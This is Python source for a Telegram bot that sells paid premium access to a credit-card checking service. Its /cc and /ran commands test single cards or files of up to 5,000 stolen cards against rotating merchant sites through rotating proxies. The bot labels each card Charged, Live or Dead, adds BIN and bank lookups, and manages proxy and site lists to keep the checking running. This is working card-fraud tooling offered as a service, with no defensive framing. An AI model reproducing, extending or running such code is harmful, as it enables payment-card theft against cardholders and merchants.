@bot.on(events.NewMessage(pattern=r'^/ban\s+(\d+)$'))
async def ban_user(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only admins can use this command."), parse_mode='html')
        return
    target_id = event.pattern_match.group(1)
    if target_id in load_banned():
        await event.reply(premium_emoji(f"⚠️ <code>{target_id}</code> is already banned."), parse_mode='html')
        return
    append_line(BANNED_FILE, target_id)
    await event.reply(premium_emoji(f"🛑 <b>User Banned!</b>\n\n<code>{target_id}</code> has been banned."), parse_mode='html')
    try:
        await bot.send_message(int(target_id), premium_emoji(
            "🛑 <b>𝗬𝗼𝘂 𝗮𝗿𝗲 𝗯𝗮𝗻𝗻𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁!</b>\n\n"
            "You have been banned by an admin. Contact support if this is an error."
        ), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern=r'^/unban\s+(\d+)$'))
async def unban_user(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only admins can use this command."), parse_mode='html')
        return
    target_id = event.pattern_match.group(1)
    remove_line(BANNED_FILE, target_id)
    await event.reply(premium_emoji(f"✅ <b>User Unbanned!</b>\n\n<code>{target_id}</code> can now use the bot."), parse_mode='html')
    try:
        await bot.send_message(int(target_id), premium_emoji(
            "✅ <b>You have been unbanned!</b>\n\n⚡ You can use the bot again. Use /start to begin."
        ), parse_mode='html')
    except Exception:
        pass

@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)$'))
async def generate_keys(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only admins can generate keys."), parse_mode='html')
        return
    count = int(event.pattern_match.group(1))
    days  = int(event.pattern_match.group(2))
    if count > 100:
        await event.reply(premium_emoji("⚠️ Maximum 100 keys per command."), parse_mode='html')
        return
    keys = [generate_key() for _ in range(count)]
    for k in keys: save_key(k, days)
    plan       = f"{days} day{'s' if days != 1 else ''} Plan"
    keys_lines = "\n".join([f"┣ <code>{k}</code>" for k in keys])
    msg = (
        f"⚡ <b>𝙆𝙚𝙮𝙨 𝙂𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙 ⚡</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"┣ ⚡ 𝗖𝗼𝘂𝗻𝘁 ➜ {count}\n"
        f"┣ ⚡ 𝗣𝗹𝗮𝗻 ➜ {plan}\n"
        f"┣ ⚡ 𝗞𝗲𝘆𝘀\n{keys_lines}\n\n"
        f"⚡ 𝗨𝘀𝗲𝗿𝘀 𝗿𝗲𝗱𝗲𝗲𝗺 𝘄𝗶𝘁𝗵 /redeem [key] ⚡"
    )
    await event.reply(premium_emoji(msg), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  /redeem — blocks if premium already active
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/redeem\s+(\S+)$'))
async def redeem_key_cmd(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(banned_reply(), parse_mode='html')
        return
    if is_premium(user_id):
        remaining = get_premium_remaining_str(user_id)
        await event.reply(
            f"{CE_STAR} <b>You already have premium!</b>\n\n"
            f"{CE_STAR} Plan: <b>{remaining}</b>\n"
            f"{CE_GHOST} <b>You cannot redeem another key while premium is active.</b>",
            parse_mode='html'
        )
        return
    key = event.pattern_match.group(1).strip()
    success, result = redeem_key_for_user(key, user_id)
    if success:
        days = result
        set_premium(user_id, days)
        await event.reply(
            f"{CE_MOON} <b>⚡ 𝗞𝗲𝘆 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! ⚡</b> {CE_MOON}\n\n"
            f"{CE_CHECK} 𝗧𝗵𝗮𝗻𝗸𝘀 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲!\n"
            f"{CE_STAR} 𝗣𝗹𝗮𝗻: <b>{days} 𝗱𝗮𝘆{'𝘀' if days != 1 else ''}</b>\n\n"
            f"{CE_CASH} 𝗬𝗼𝘂 𝗻𝗼𝘄 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼:\n"
            f"{CE_MOON} /cc — 𝗖𝗵𝗲𝗰𝗸 𝗖𝗖\n"
            f"{CE_MOON} /ran — 𝗙𝗶𝗹𝗲 𝗖𝗵𝗲𝗰𝗸\n\n"
            f"{CE_FLAME2} 𝗘𝗻𝗷𝗼𝘆 𝘆𝗼𝘂𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗲𝘅𝗽𝗲𝗿𝗶𝗲𝗻𝗰𝗲!",
            parse_mode='html'
        )
    elif result == 'already_used':
        await event.reply(premium_emoji("❌ <b>This key has already been redeemed.</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ <b>Invalid key.</b> Please check and try again."), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  /cc — single card check
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(banned_reply(), parse_mode='html')
        return
    if not is_premium(user_id):
        await event.reply(premium_emoji("😡 <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    try:
        sender   = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"
    sites   = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available."), parse_mode='html'); return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card       = cards[0]
    status_msg = await event.reply(
        premium_emoji(f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
                      f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n<blockquote>💳 Card: <code>{card}</code></blockquote>"),
        parse_mode='html'
    )
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':    se, st = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        elif result['status'] == 'Approved': se, st = "🔥", "𝐋𝐢𝐯𝐞"
        else:                                se, st = "❌", "𝐃𝐞𝐚𝐝"
        final_resp = (
            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n"
            f"<blockquote>{se} Status: {st}</blockquote>\n"
            f"<blockquote>💳 Card: <code>{result['card']}</code></blockquote>\n"
            f"<blockquote>📝 Response: {result['message'][:150]}</blockquote>\n"
            f"<blockquote>🌐 Gateway: 🔥 {result.get('gateway','Unknown')} | 💰 {result.get('price','-')}</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n"
            f"<pre>𝗕𝗜𝗡: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n\n"
            f"🤖 <b>Bot By: <a href=\"tg://user?id={OWNER_ID}\">Ukraine</a></b>"
        )
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  /ran — random file check
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/ran'))
async def ran_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(banned_reply(), parse_mode='html'); return
    try:
        sender   = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("😡 <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("😡 Please reply to a .txt file containing cards."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("😡 Please reply to a .txt file."), parse_mode='html')
        return
    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available."), parse_mode='html'); return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return

    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found in file."), parse_mode='html')
        os.remove(file_path); return
    if len(cards) > 5000:
        cards = cards[:5000]
    os.remove(file_path)

    total_cards = len(cards)
    starter_id  = user_id

    start_text = (
        f"{CE_MOON} <b>𝗥𝗮𝗻𝗱𝗼𝗺 𝗙𝗶𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱!</b>\n\n"
        f"{CE_STAR} 𝗧𝗼𝘁𝗮𝗹 𝗖𝗖𝘀: <b>{total_cards}</b>\n"
        f"{CE_MASK} 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟯 │ 𝗔𝗿𝗮𝗮𝗺 𝗦𝗲 𝗖𝗵𝗲𝗰𝗸\n"
        f"{CE_GRAY} 𝗥𝗮𝗻𝗱𝗼𝗺 𝗽𝗿𝗼𝘅𝘆 + 𝘀𝗶𝘁𝗲 𝗽𝗲𝗿 𝗖𝗖\n"
        f"{CE_CASH} 𝗔𝘂𝘁𝗼-𝗿𝗲𝘁𝗿𝘆 𝗼𝗻 𝗱𝗲𝗮𝗱 𝘀𝗶𝘁𝗲𝘀\n\n"
        f"{CE_ANIME} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href=\"tg://user?id={user_id}\">{username}</a>"
    )
    await status_msg.edit(
        start_text,
        buttons=[[Button.inline("🔴 𝗦𝘁𝗼𝗽 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴", f"stop_{starter_id}".encode())]],
        parse_mode='html'
    )

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False, 'starter_id': starter_id}

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'start_time': time.time(),
        'last_response': '—',
        'last_card': ''
    }

    try:
        queue            = asyncio.Queue()
        for card in cards: queue.put_nowait(card)
        last_update_time = [time.time()]
        lock             = asyncio.Lock()

        async def worker():
            while not queue.empty() and session_key in active_sessions:
                sess = active_sessions.get(session_key)
                if not sess: break
                while sess.get('paused', False):
                    await asyncio.sleep(0.5)
                    sess = active_sessions.get(session_key)
                    if not sess: return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cur_sites   = load_sites()
                cur_proxies = load_proxies()
                if not cur_sites or not cur_proxies: break
                res = await check_card_with_retry(card, cur_sites, cur_proxies, max_retries=1)
                async with lock:
                    all_results['checked'] += 1
                    all_results['last_response'] = res.get('message', '—')[:60]
                    all_results['last_card']     = res.get('card', '')
                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                    elif res['status'] == 'Approved':
                        all_results['approved'].append(res)
                    else:
                        all_results['dead'].append(res)
                if res['status'] in ('Charged', 'Approved'):
                    await send_realtime_hit(user_id, res, res['status'], username)
                queue.task_done()
                if session_key in active_sessions:
                    try:
                        await update_progress(user_id, status_msg.id, all_results,
                                              all_results['checked'], username, starter_id)
                    except Exception:
                        pass
                await asyncio.sleep(2)

        workers = [asyncio.create_task(worker()) for _ in range(3)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done(): w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username, starter_id)

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try: await status_msg.delete()
        except: pass
        await send_final_results(user_id, all_results, username)

# ══════════════════════════════════════════════════════════════════════════════
#  STOP CALLBACK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    clicker_id = event.sender_id
    starter_id = int(event.pattern_match.group(1))
    if clicker_id != starter_id and not is_admin(clicker_id):
        await event.answer("⚠️ Only the person who started this check can stop it!", alert=True)
        return
    message_id  = event.message_id
    session_key = None
    for k in list(active_sessions.keys()):
        if k.endswith(f"_{message_id}"):
            session_key = k; break
    if session_key and session_key in active_sessions:
        del active_sessions[session_key]
    try:
        sender  = await event.get_sender()
        stopper = sender.username if sender.username else str(clicker_id)
    except Exception:
        stopper = str(clicker_id)
    stop_text = (
        f"{CE_REDX} <b>𝗥𝗮𝗻𝗱𝗼𝗺 𝗙𝗶𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 𝗦𝘁𝗼𝗽𝗽𝗲𝗱!</b>\n\n"
        f"{CE_MASK} 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: 𝟯 │ 𝗔𝗿𝗮𝗮𝗺 𝗦𝗲 𝗖𝗵𝗲𝗰𝗸\n"
        f"{CE_GRAY} 𝗥𝗮𝗻𝗱𝗼𝗺 𝗽𝗿𝗼𝘅𝘆 + 𝘀𝗶𝘁𝗲 𝗽𝗲𝗿 𝗖𝗖\n"
        f"{CE_CASH} 𝗔𝘂𝘁𝗼-𝗿𝗲𝘁𝗿𝘆 𝗼𝗻 𝗱𝗲𝗮𝗱 𝘀𝗶𝘁𝗲𝘀\n\n"
        f"{CE_ANIME} 𝗦𝘁𝗼𝗽𝗽𝗲𝗱 𝗯𝘆: <a href=\"tg://user?id={clicker_id}\">{stopper}</a>"
    )
    await event.edit(stop_text, parse_mode='html')
    await event.answer("🛑 Check stopped!")

# ══════════════════════════════════════════════════════════════════════════════
#  /f — FEEDBACK
# ══════════════════════════════════════════════════════════════════════════════
FEEDBACK_USAGE_TEXT = (
    f"{CE_MOON} <b>𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗨𝘀𝗮𝗴𝗲</b>\n\n"
    f"{CE_CHECK} 𝗦𝗲𝗻𝗱 𝗮 𝗽𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵 𝗰𝗮𝗽𝘁𝗶𝗼𝗻:\n"
    f"    <code>/f your feedback message</code>\n\n"
    f"{CE_CHAT} 𝗢𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗽𝗵𝗼𝘁𝗼 𝘄𝗶𝘁𝗵:\n"
    f"    <code>/f your feedback message</code>\n\n"
    f"{CE_GHOST} <b>𝗕𝗼𝘁𝗵 𝗽𝗵𝗼𝘁𝗼 𝗮𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗮𝗿𝗲 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗱!</b>"
)

@bot.on(events.NewMessage(pattern=r'^/f'))
async def feedback_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(banned_reply(), parse_mode='html'); return

    raw_text      = (event.message.text or event.message.message or "").strip()
    feedback_text = raw_text[2:].strip() if raw_text.lower().startswith('/f') else raw_text.strip()

    photo_msg = None
    if event.message.media and hasattr(event.message.media, 'photo'):
        photo_msg = event.message
    elif event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.media and hasattr(replied.media, 'photo'):
            photo_msg = replied

    if not feedback_text or not photo_msg:
        await event.reply(FEEDBACK_USAGE_TEXT, parse_mode='html')
        return

    try:
        sender   = await event.get_sender()
        username = f"@{sender.username}" if sender.username else "No username"
        name     = (sender.first_name or '') + (' ' + sender.last_name if sender.last_name else '')
    except Exception:
        username, name = str(user_id), "Unknown"

    try:
        me       = await bot.get_me()
        bot_name = f"@{me.username}" if me.username else "Bot"
    except Exception:
        bot_name = "@Bot"

    date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    await event.reply(
        f"{CE_MONEYBAG} <b>𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!</b>\n\n"
        f"{CE_MOON} 𝗬𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻𝘀.\n"
        f"{CE_FLAME2} 𝗧𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸!",
        parse_mode='html'
    )

    group_caption = (
        f"{CF_GHOST} <b>𝗕𝗼𝘁 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸</b>\n\n"
        f"{CF_HAT} 𝗕𝗼𝘁: {bot_name}\n"
        f"{CF_SHIELD} 𝗙𝗿𝗼𝗺: <a href=\"tg://user?id={user_id}\">{name}</a>\n"
        f"{CF_STAR} 𝗡𝗮𝗺𝗲: {name}\n"
        f"{CF_SHIELD} 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n"
        f"{CF_DRIP} 𝗨𝘀𝗲𝗿 𝗜𝗗: <code>{user_id}</code>\n"
        f"{CF_CARD2} 𝗗𝗮𝘁𝗲: {date_str}\n\n"
        f"{CF_STAR} 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸:\n{feedback_text}\n\n"
        f"{CF_CHAT} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗯𝘆: <a href=\"tg://user?id={OWNER_ID}\">Ukraine</a>"
    )

    try:
        sent_msg = await bot.send_file(
            GROUP_USERNAME,
            file=photo_msg.media,
            caption=group_caption,
            parse_mode='html'
        )
        try:
            await bot.pin_message(GROUP_USERNAME, sent_msg.id, notify=False)
        except Exception:
            pass
    except Exception as e:
        try:
            await bot.send_file(OWNER_ID, file=photo_msg.media, caption=group_caption, parse_mode='html')
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
#  PROXY COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    proxy      = event.message.text.split(' ', 1)[1].strip()
    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html'); return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    with open(PROXY_FILE, 'w') as f:
        for p in new_proxies: f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices."), parse_mode='html'); return
    current_proxies = load_proxies()
    removed, new_proxies = [], []
    for i, p in enumerate(current_proxies):
        if i in indices: removed.append(p)
        else: new_proxies.append(p)
    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html'); return
    with open(PROXY_FILE, 'w') as f:
        for p in new_proxies: f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html'); return
    timestamp       = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    async with aiofiles.open(backup_filename, 'w') as f:
        for p in current_proxies: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"📦 <b>Backup & Cleared {len(current_proxies)} proxies!</b>"),
                      file=backup_filename, parse_mode='html')
    try: os.remove(backup_filename)
    except: pass
    with open(PROXY_FILE, 'w') as f: f.write("")

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html'); return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename  = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, p in enumerate(current_proxies): await f.write(f"{i+1}. {p}\n")
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>"), file=filename, parse_mode='html')
        try: os.remove(filename)
        except: pass

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    args = event.message.text.split('\n')
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: /addproxy followed by proxies, one per line."), parse_mode='html'); return
    proxies_to_add  = [l.strip() for l in args[1:] if l.strip()]
    current_proxies = load_proxies()
    new_proxies     = [p for p in proxies_to_add if p not in current_proxies]
    if not new_proxies:
        await event.reply(premium_emoji("⚠️ All provided proxies already exist."), parse_mode='html'); return
    with open(PROXY_FILE, 'a') as f:
        for p in new_proxies: f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ <b>Added {len(new_proxies)} proxies!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy$'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ proxy.txt is empty."), parse_mode='html'); return
    status_msg    = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
    alive_proxies, dead_proxies = [], []
    for i in range(0, len(proxies), 50):
        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+50]])
        for res in results:
            (alive_proxies if res['status'] == 'alive' else dead_proxies).append(res['proxy'])
        await status_msg.edit(premium_emoji(
            f"🔥 Checking...\n\nChecked: {len(alive_proxies)+len(dead_proxies)}/{len(proxies)}\n"
            f"Alive: {len(alive_proxies)} | Dead: {len(dead_proxies)}"
        ), parse_mode='html')
    with open(PROXY_FILE, 'w') as f:
        for p in alive_proxies: f.write(f"{p}\n")
    await status_msg.edit(premium_emoji(
        f"✅ <b>Proxy Check Done!</b>\n\nTotal: {len(proxies)} | Alive: {len(alive_proxies)} | Removed: {len(dead_proxies)}"
    ), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  SITE COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: /rm https://site.com"), parse_mode='html'); return
    url_to_remove = args[1].strip()
    current_sites = load_sites()
    if url_to_remove not in current_sites:
        await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html'); return
    new_sites = [s for s in current_sites if s != url_to_remove]
    with open(SITES_FILE, 'w') as f:
        for s in new_sites: f.write(f"{s}\n")
    await event.reply(premium_emoji(f"✅ <b>Site Removed!</b>\n\n<code>{url_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id): await event.reply(banned_reply(), parse_mode='html'); return
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html'); return
    sites   = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ sites.txt is empty."), parse_mode='html'); return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html'); return
    status_msg  = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
    alive_sites, dead_sites = [], []
    for i in range(0, len(sites), 10):
        batch         = sites[i:i+10]
        fresh_proxies = load_proxies() or proxies
        results       = await asyncio.gather(*[test_site(s, random.choice(fresh_proxies)) for s in batch])
        for res in results:
            (alive_sites if res['status'] == 'alive' else dead_sites).append(res['site'])
        await status_msg.edit(premium_emoji(
            f"🔥 Checking sites...\n\nChecked: {len(alive_sites)+len(dead_sites)}/{len(sites)}\n"
            f"Alive: {len(alive_sites)} | Dead: {len(dead_sites)}"
        ), parse_mode='html')
    with open(SITES_FILE, 'w') as f:
        for s in alive_sites: f.write(f"{s}\n")
    await status_msg.edit(premium_emoji(
        f"✅ <b>Site Check Done!</b>\n\nTotal: {len(sites)} | Alive: {len(alive_sites)} | Removed: {len(dead_sites)}"
    ), parse_mode='html')

# ══════════════════════════════════════════════════════════════════════════════
#  BAN GUARD
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage)
async def global_ban_check(event):
    if is_banned(event.sender_id) and event.message.text and not event.message.text.startswith('/start'):
        try:
            await event.reply(banned_reply(), parse_mode='html')
        except Exception:
            pass

# ══════════════════════════════════════════════════════════════════════════════
print("✅ Bot started successfully!")
bot.run_until_disconnected()
